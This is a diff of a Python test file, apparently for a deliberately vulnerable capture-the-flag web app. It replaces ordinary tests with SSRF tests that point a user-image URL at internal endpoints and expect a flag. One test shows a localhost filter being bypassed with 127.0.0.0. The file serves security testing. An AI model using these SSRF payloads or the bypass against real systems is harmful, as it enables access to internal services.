@@ -70,10 +70,10 @@ def registered_user():
     token = login_user(username, password)
     return username, password, user_info, token
 
-def test_user_image_registration_and_download(registered_user):
+def test_get_internal_network_info_with_ssrf(registered_user):
     _, _, _, token = registered_user
 
-    image_url = "http://localhost:8000/admin/users"
+    image_url = "http://localhost:8000/internal/network"
     
     # ユーザー画像を登録
     image_registration_result = register_user_image(image_url, token)
@@ -81,19 +81,27 @@ def test_user_image_registration_and_download(registered_user):
     
     # ユーザー画像を取得
     image_download_result = get_user_image(token)
-    assert image_download_result != None
+    assert "flag" in image_download_result
 
-def test_export_post_to_pdf(registered_user):
-    username, _, _, token = registered_user
+def test_get_internal_developer_info_with_ssrf(registered_user):
+    _, _, _, token = registered_user
 
-    # For this test, we assume that there's an endpoint to create a post and return its ID.
-    res = create_post("Sample Title", "Sample Content", token)
-    post_id = res["id"]
+    image_url = "http://localhost:8000/internal/developer" # 刺さらない
 
-    pdf_filename = export_post_to_pdf(post_id, token)
+    # ユーザー画像を登録
+    image_registration_result = register_user_image(image_url, token)
+    assert image_registration_result["detail"] == "Image URL updated successfully"
 
-    # Verify if the file is saved successfully
-    assert os.path.exists(pdf_filename)
+    # ユーザー画像を取得
+    image_download_result = get_user_image(token)
+    assert "Failed to fetch the image" in image_download_result
 
-    # Clean up: delete the downloaded PDF
-    os.remove(pdf_filename)
+    image_url = "http://127.0.0.0:8000/internal/developer" # 刺さる
+
+    # ユーザー画像を登録
+    image_registration_result = register_user_image(image_url, token)
+    assert image_registration_result["detail"] == "Image URL updated successfully"
+
+    # ユーザー画像を取得
+    image_download_result = get_user_image(token)
+    assert "flag" in image_download_result
